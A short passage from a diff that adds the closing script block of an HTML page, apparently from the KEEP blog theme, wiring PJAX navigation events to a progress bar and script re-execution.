+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
